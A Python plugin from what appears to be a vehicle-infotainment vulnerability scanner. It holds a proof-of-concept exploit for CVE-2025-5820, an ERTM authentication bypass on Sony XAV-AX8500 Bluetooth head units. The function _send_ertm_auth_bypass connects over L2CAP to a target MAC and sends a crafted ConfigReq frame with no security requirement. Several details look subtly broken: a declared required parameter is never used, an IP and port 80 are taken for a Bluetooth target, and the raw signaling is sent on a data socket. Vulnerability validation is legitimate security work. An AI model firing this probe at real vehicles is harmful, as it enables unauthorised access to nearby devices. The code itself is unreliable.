#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket
import struct
import subprocess

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _check_bt_adapter() -> dict:
    info = {"adapter_found": False, "hcitool_available": False}
    try:
        r = subprocess.run(["hcitool", "dev"], capture_output=True, text=True, timeout=5)
        info["hcitool_available"] = True
        for line in r.stdout.splitlines():
            if line.strip().startswith("hci"):
                info["adapter_found"] = True
                break
    except FileNotFoundError:
        info["error"] = "hcitool not found"
    except subprocess.TimeoutExpired:
        info["error"] = "timeout"
    return info


def _send_ertm_auth_bypass(mac: str) -> dict:
    """
    CVE-2025-5820: ERTM auth bypass - send L2CAP ERTM configuration request
    with auth requirements set to 'none' to bypass authentication in ERTM mode.
    """
    result = {"sent": False, "error": ""}
    try:
        AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
        BTPROTO_L2CAP = getattr(socket, "BTPROTO_L2CAP", 0)
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(8.0)
        bdaddr_bytes = bytes(int(b, 16) for b in reversed(mac.split(":")))
        # Connect via SDP PSM first, then send ERTM configuration
        addr = struct.pack("<H H 6s H B", AF_BLUETOOTH, 0x0001, bdaddr_bytes, 0, 0)
        sock.connect(addr)

        # L2CAP ConfigReq with ERTM mode option (mode=0x03=ERTM)
        # and no security requirement - auth bypass attempt
        config_opt = b'\x04\x09' + struct.pack("<B H H H H", 0x03, 0, 0, 0, 0xFFFF)
        # Raw L2CAP signaling frame (ConfigReq, identifier=1)
        sig_payload = struct.pack("<B B H H H", 0x04, 0x01, len(config_opt) + 4, 0x0040, 0x0000)
        sig_payload += config_opt
        sock.sendall(sig_payload)
        result["sent"] = True
        sock.close()
    except OSError as exc:
        result["error"] = str(exc)
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    bt_mac = params.get("bluetooth_mac") or params.get("bt_mac", "")

    evidence = {
        "cve": "CVE-2025-5820",
        "target": bt_mac or "Sony XAV-AX8500 BT head unit",
        "technique": (
            "ERTM auth bypass probe: send L2CAP ConfigReq with ERTM mode and "
            "no security requirement to bypass Bluetooth authentication"
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-5820",
        "vuln_detail": (
            "Sony BT stack improperly handles ERTM mode negotiation, "
            "allowing attacker to establish ERTM channels without authentication"
        ),
    }

    adapter_info = _check_bt_adapter()
    evidence["bt_adapter"] = adapter_info

    if not adapter_info["adapter_found"]:
        evidence["note"] = "No BT adapter available"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    if not bt_mac:
        evidence["note"] = "bluetooth_mac parameter required"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    ertm_result = _send_ertm_auth_bypass(bt_mac)
    evidence["ertm_probe"] = ertm_result

    if ertm_result["sent"]:
        vulnerable = None
        evidence["note"] = (
            "ERTM auth bypass frame sent. Check if BT channel established without pairing "
            "prompt to confirm CVE-2025-5820."
        )
    else:
        vulnerable = None
        evidence["note"] = f"ERTM probe failed: {ertm_result['error']}"

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
    }


VULN = {
    "id": 27,
    "cve": "CVE-2025-5820",
    "year": 2025,
    "domain": "蓝牙/IVI",
    "vendor_product": "Sony XAV-AX8500",
    "component": "Bluetooth stack",
    "type": "Bluetooth ERTM认证绕过",
    "summary": "ERTM通道认证绕过，网络邻近攻击者可绕过认证。",
    "source_description": "Sony XAV-AX8500 Bluetooth ERTM Channel Authentication Bypass Vulnerability. This vulnerability allows network-adjacent attackers to bypass authentication on affected Sony XAV-AX8500 devices. Authentication is not required to exploit this vulnerability.\n\nThe specific flaw exists within the implementation of Bluetooth ERTM channel communication. The issue results from improper channel data initialization. An attacker can leverage this vulnerability to bypass authentication on the system. Was ZDI-CAN-26285.",
    "poc_status": "有ZDI公开技术公告；未见官方PoC代码",
    "research_value": "非常适合IVI蓝牙协议栈模糊测试与攻击链研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5820",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-5820",
        "https://www.zerodayinitiative.com/advisories/ZDI-25-358/",
        "https://www.sony.com/electronics/support/mobile-cd-players-digital-media-players-xav-series/xav-ax8500/software/00344092",
        "https://cveawg.mitre.org/api/cve/CVE-2025-5820"
    ],
    "affected": [
        {
            "vendor": "Sony",
            "product": "XAV-AX8500",
            "versions": [
                {
                    "version": "2.00.01",
                    "status": "affected"
                }

            ]
        }
    ],
    "signature_tokens": [
        "CVE-2025-5820",
        "Sony",
        "XAV-AX8500",
        "Bluetooth",
        "stack",
        "ERTM",
        "Channel",
        "Authentication",
        "Bypass",
        "Vulnerability",
        "vulnerability",
        "network-adjacent",
        "attackers",
        "bypass",
        "authentication",
        "devices",
        "required",
        "exploit",
        "specific",
        "flaw",
        "exists",
        "within",
        "implementation"
    ]
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['USB Bluetooth 适配器（Ubertooth One 推荐用于嗅探）', '或内置 HCI 的 Linux 主机'],
    "connection": 'HCI（/dev/hci0）或 USB（Ubertooth）',
    "tools":      ['BlueZ ≥ 5.48', 'Ubertooth 工具链', 'Wireshark + BT 插件'],
    "firmware":   'Ubertooth firmware 2020-12-R1（ubertooth-dfu）',
    "setup":      'ubertooth-util -v && hciconfig hci0 up',
}



try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc47CVE20255820AuthBypassAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-027'
    meta_poc_name = 'CVE-2025-5820 Bluetooth ERTM认证绕过 Active Validation'
    meta_cve_id = 'CVE-2025-5820'
    meta_severity = 'High'
    meta_protocol = 'bluetooth'
    meta_target_os = ['all']
    meta_required_params = ['wireless_scan_text']
    meta_profiles = ['bluetooth']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2025-5820'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2025-5820']
    meta_attack_surface = '无线/外设接口'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "47_Sony_XAV_AX8500_BT_ERTM_Auth_Bypass_Audit") if "VULN" in dir() else "47_Sony_XAV_AX8500_BT_ERTM_Auth_Bypass_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc47CVE20255820AuthBypassAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
